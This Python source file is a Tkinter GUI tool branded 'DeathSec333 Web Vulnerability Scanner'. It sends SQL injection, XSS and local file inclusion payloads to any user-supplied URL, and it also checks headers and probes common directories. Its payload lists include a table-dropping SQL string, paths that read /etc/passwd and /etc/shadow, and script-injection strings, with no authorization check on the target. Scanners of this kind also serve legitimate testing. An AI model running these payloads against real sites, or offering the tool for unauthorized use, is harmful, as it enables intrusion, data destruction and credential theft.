#!/usr/bin/env python3
"""
DeathSec333 Web Vulnerability Scanner
SQL Injection, XSS, and Security Testing Tool
"""

import requests
import urllib.parse
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import re
import time
from datetime import datetime

class WebVulnerabilityScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("DeathSec333 - Web Vulnerability Scanner")
        self.root.geometry("1000x800")
        self.root.configure(bg='black')
        
        self.scanning = False
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'DeathSec333-Scanner/1.0'})
        
        self.create_gui()
    
    def create_gui(self):
        # Title
        title = tk.Label(self.root, text="DeathSec333 Web Vulnerability Scanner", 
                        fg='#ff0040', bg='black', font=('Courier', 16, 'bold'))
        title.pack(pady=10)
        
        # Target Input
        target_frame = tk.Frame(self.root, bg='black')
        target_frame.pack(pady=10, fill='x', padx=20)
        
        tk.Label(target_frame, text="Target URL:", fg='#00ff00', bg='black',
                font=('Courier', 12, 'bold')).pack(anchor='w')
        self.target_entry = tk.Entry(target_frame, width=80, font=('Courier', 10))
        self.target_entry.pack(fill='x', pady=5)
        self.target_entry.insert(0, "http://testphp.vulnweb.com")
        
        # Scan Options
        options_frame = tk.Frame(self.root, bg='black')
        options_frame.pack(pady=10, fill='x', padx=20)
        
        tk.Label(options_frame, text="Scan Options:", fg='#00ff00', bg='black',
                font=('Courier', 12, 'bold')).pack(anchor='w')
        
        checks_frame = tk.Frame(options_frame, bg='black')
        checks_frame.pack(fill='x', pady=5)
        
        self.scan_sql = tk.BooleanVar(value=True)
        self.scan_xss = tk.BooleanVar(value=True)
        self.scan_lfi = tk.BooleanVar(value=True)
        self.scan_headers = tk.BooleanVar(value=True)
        self.scan_dirs = tk.BooleanVar(value=True)
        
        tk.Checkbutton(checks_frame, text="SQL Injection", variable=self.scan_sql,
                      fg='#00ff00', bg='black', selectcolor='#333333',
                      font=('Courier', 10)).pack(side='left', padx=10)
        tk.Checkbutton(checks_frame, text="XSS", variable=self.scan_xss,
                      fg='#00ff00', bg='black', selectcolor='#333333',
                      font=('Courier', 10)).pack(side='left', padx=10)
        tk.Checkbutton(checks_frame, text="LFI", variable=self.scan_lfi,
                      fg='#00ff00', bg='black', selectcolor='#333333',
                      font=('Courier', 10)).pack(side='left', padx=10)
        tk.Checkbutton(checks_frame, text="Headers", variable=self.scan_headers,
                      fg='#00ff00', bg='black', selectcolor='#333333',
                      font=('Courier', 10)).pack(side='left', padx=10)
        tk.Checkbutton(checks_frame, text="Directories", variable=self.scan_dirs,
                      fg='#00ff00', bg='black', selectcolor='#333333',
                      font=('Courier', 10)).pack(side='left', padx=10)
        
        # Control Buttons
        button_frame = tk.Frame(self.root, bg='black')
        button_frame.pack(pady=15)
        
        self.start_btn = tk.Button(button_frame, text="Start Scan",
                                  command=self.start_scan, bg='#ff0040', fg='white',
                                  font=('Courier', 12, 'bold'))
        self.start_btn.pack(side='left', padx=10)
        
        self.stop_btn = tk.Button(button_frame, text="Stop Scan",
                                 command=self.stop_scan, bg='#666666', fg='white',
                                 font=('Courier', 12, 'bold'), state='disabled')
        self.stop_btn.pack(side='left', padx=10)
        
        self.clear_btn = tk.Button(button_frame, text="Clear Results",
                                  command=self.clear_results, bg='#333333', fg='white',
                                  font=('Courier', 12, 'bold'))
        self.clear_btn.pack(side='left', padx=10)
        
        # Progress
        progress_frame = tk.Frame(self.root, bg='black')
        progress_frame.pack(fill='x', padx=20, pady=10)
        
        tk.Label(progress_frame, text="Progress:", fg='#00ff00', bg='black',
                font=('Courier', 10)).pack(anchor='w')
        
        self.progress = ttk.Progressbar(progress_frame, length=400, mode='indeterminate')
        self.progress.pack(fill='x', pady=5)
        
        self.status_label = tk.Label(progress_frame, text="Ready", fg='#00ff00', bg='black',
                                    font=('Courier', 10))
        self.status_label.pack(anchor='w')
        
        # Results Area
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=20, pady=10)
        
        # Vulnerabilities Tab
        vuln_frame = tk.Frame(notebook, bg='black')
        notebook.add(vuln_frame, text='Vulnerabilities')
        
        tk.Label(vuln_frame, text="Discovered Vulnerabilities:", fg='#ff0040', bg='black',
                font=('Courier', 12, 'bold')).pack(anchor='w', pady=5)
        
        self.vuln_text = scrolledtext.ScrolledText(vuln_frame,
                                                  bg='black', fg='#ff0040',
                                                  font=('Courier', 10),
                                                  height=20)
        self.vuln_text.pack(fill='both', expand=True)
        
        # Log Tab
        log_frame = tk.Frame(notebook, bg='black')
        notebook.add(log_frame, text='Scan Log')
        
        tk.Label(log_frame, text="Scan Log:", fg='#00ff00', bg='black',
                font=('Courier', 12, 'bold')).pack(anchor='w', pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame,
                                                 bg='black', fg='#00ff00',
                                                 font=('Courier', 10),
                                                 height=20)
        self.log_text.pack(fill='both', expand=True)
    
    def log_message(self, message, log_type="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if log_type == "vuln":
            self.vuln_text.insert(tk.END, f"[{timestamp}] {message}\n")
            self.vuln_text.see(tk.END)
        
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def test_sql_injection(self, url):
        self.log_message("Testing for SQL Injection vulnerabilities...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "admin'--",
            "' OR 1=1 LIMIT 1--"
        ]
        
        # Test URL parameters
        if '?' in url:
            base_url, params = url.split('?', 1)
            param_pairs = params.split('&')
            
            for param_pair in param_pairs:
                if '=' in param_pair:
                    param_name, param_value = param_pair.split('=', 1)
                    
                    for payload in sql_payloads:
                        if not self.scanning:
                            break
                            
                        test_params = params.replace(f"{param_name}={param_value}", 
                                                   f"{param_name}={urllib.parse.quote(payload)}")
                        test_url = f"{base_url}?{test_params}"
                        
                        try:
                            response = self.session.get(test_url, timeout=10)
                            
                            # Check for SQL error messages
                            error_patterns = [
                                r"mysql_fetch_array\(\)",
                                r"ORA-\d{5}",
                                r"Microsoft.*ODBC.*SQL Server",
                                r"PostgreSQL.*ERROR",
                                r"Warning.*mysql_.*",
                                r"SQL syntax.*MySQL"
                            ]
                            
                            for pattern in error_patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    vuln_msg = f"SQL INJECTION FOUND!\nURL: {test_url}\nParameter: {param_name}\nPayload: {payload}"
                                    self.log_message(vuln_msg, "vuln")
                                    self.vulnerabilities.append({
                                        'type': 'SQL Injection',
                                        'url': test_url,
                                        'parameter': param_name,
                                        'payload': payload
                                    })
                                    break
                        
                        except requests.RequestException:
                            continue
    
    def test_xss(self, url):
        self.log_message("Testing for XSS vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        # Test URL parameters for XSS
        if '?' in url:
            base_url, params = url.split('?', 1)
            param_pairs = params.split('&')
            
            for param_pair in param_pairs:
                if '=' in param_pair:
                    param_name, param_value = param_pair.split('=', 1)
                    
                    for payload in xss_payloads:
                        if not self.scanning:
                            break
                            
                        test_params = params.replace(f"{param_name}={param_value}", 
                                                   f"{param_name}={urllib.parse.quote(payload)}")
                        test_url = f"{base_url}?{test_params}"
                        
                        try:
                            response = self.session.get(test_url, timeout=10)
                            
                            # Check if payload is reflected
                            if payload in response.text or urllib.parse.unquote(payload) in response.text:
                                vuln_msg = f"XSS VULNERABILITY FOUND!\nURL: {test_url}\nParameter: {param_name}\nPayload: {payload}"
                                self.log_message(vuln_msg, "vuln")
                                self.vulnerabilities.append({
                                    'type': 'XSS',
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload
                                })
                        
                        except requests.RequestException:
                            continue
    
    def test_lfi(self, url):
        self.log_message("Testing for Local File Inclusion...")
        
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "../../../../etc/shadow",
            "../../../proc/version"
        ]
        
        params = ['file', 'page', 'include', 'path', 'doc', 'document']
        
        for param in params:
            if not self.scanning:
                break
                
            for payload in lfi_payloads:
                if not self.scanning:
                    break
                    
                try:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for file inclusion indicators
                    lfi_indicators = [
                        "root:x:0:0:",
                        "[boot loader]",
                        "Linux version",
                        "daemon:x:"
                    ]
                    
                    for indicator in lfi_indicators:
                        if indicator in response.text:
                            vuln_msg = f"LFI VULNERABILITY FOUND!\nURL: {test_url}\nParameter: {param}\nPayload: {payload}"
                            self.log_message(vuln_msg, "vuln")
                            self.vulnerabilities.append({
                                'type': 'LFI',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload
                            })
                            break
                
                except requests.RequestException:
                    continue
    
    def test_security_headers(self, url):
        self.log_message("Testing security headers...")
        
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options header',
                'X-XSS-Protection': 'Missing X-XSS-Protection header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing CSP header'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    vuln_msg = f"SECURITY HEADER MISSING!\nURL: {url}\nIssue: {description}"
                    self.log_message(vuln_msg, "vuln")
                    self.vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'url': url,
                        'issue': description,
                        'header': header
                    })
            
            # Check server disclosure
            if 'Server' in headers:
                server_info = headers['Server']
                vuln_msg = f"SERVER INFO DISCLOSED!\nURL: {url}\nServer: {server_info}"
                self.log_message(vuln_msg, "vuln")
                self.vulnerabilities.append({
                    'type': 'Information Disclosure',
                    'url': url,
                    'server': server_info
                })
        
        except requests.RequestException as e:
            self.log_message(f"Error testing headers: {str(e)}")
    
    def test_directories(self, url):
        self.log_message("Testing for common directories...")
        
        common_dirs = [
            'admin', 'administrator', 'login', 'test', 'backup', 'config',
            'uploads', 'files', 'images', 'api', 'phpmyadmin',
            'wp-admin', 'dashboard', 'panel'
        ]
        
        base_url = url.rstrip('/')
        
        for directory in common_dirs:
            if not self.scanning:
                break
                
            test_url = f"{base_url}/{directory}/"
            
            try:
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code in [200, 403]:
                    vuln_msg = f"DIRECTORY FOUND!\nURL: {test_url}\nStatus: {response.status_code}"
                    self.log_message(vuln_msg, "vuln")
                    self.vulnerabilities.append({
                        'type': 'Directory Discovery',
                        'url': test_url,
                        'status_code': response.status_code
                    })
            
            except requests.RequestException:
                continue
    
    def start_scan(self):
        target_url = self.target_entry.get().strip()
        if not target_url:
            messagebox.showerror("Error", "Please enter a target URL!")
            return
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        self.scanning = True
        self.vulnerabilities = []
        
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.progress.start()
        
        self.log_message("=" * 60)
        self.log_message(f"Starting vulnerability scan on: {target_url}")
        self.log_message("=" * 60)
        
        # Start scanning in separate thread
        scan_thread = threading.Thread(target=self.perform_scan, args=(target_url,))
        scan_thread.daemon = True
        scan_thread.start()
    
    def perform_scan(self, url):
        try:
            if self.scan_sql.get():
                self.status_label.config(text="Testing SQL Injection...")
                self.test_sql_injection(url)
            
            if self.scan_xss.get() and self.scanning:
                self.status_label.config(text="Testing XSS...")
                self.test_xss(url)
            
            if self.scan_lfi.get() and self.scanning:
                self.status_label.config(text="Testing LFI...")
                self.test_lfi(url)
            
            if self.scan_headers.get() and self.scanning:
                self.status_label.config(text="Testing Security Headers...")
                self.test_security_headers(url)
            
            if self.scan_dirs.get() and self.scanning:
                self.status_label.config(text="Testing Directories...")
                self.test_directories(url)
            
            if self.scanning:
                self.log_message("=" * 60)
                self.log_message(f"Scan completed! Found {len(self.vulnerabilities)} vulnerabilities")
                self.status_label.config(text=f"Scan complete - {len(self.vulnerabilities)} vulnerabilities found")
        
        except Exception as e:
            self.log_message(f"Error during scan: {str(e)}")
        
        finally:
            self.scanning = False
            self.start_btn.config(state='normal')
            self.stop_btn.config(state='disabled')
            self.progress.stop()
    
    def stop_scan(self):
        self.scanning = False
        self.log_message("Scan stopped by user")
        self.status_label.config(text="Scan stopped")
    
    def clear_results(self):
        self.vuln_text.delete(1.0, tk.END)
        self.log_text.delete(1.0, tk.END)
        self.vulnerabilities = []
        self.status_label.config(text="Ready")

if __name__ == "__main__":
    root = tk.Tk()
    app = WebVulnerabilityScanner(root)
    root.mainloop()
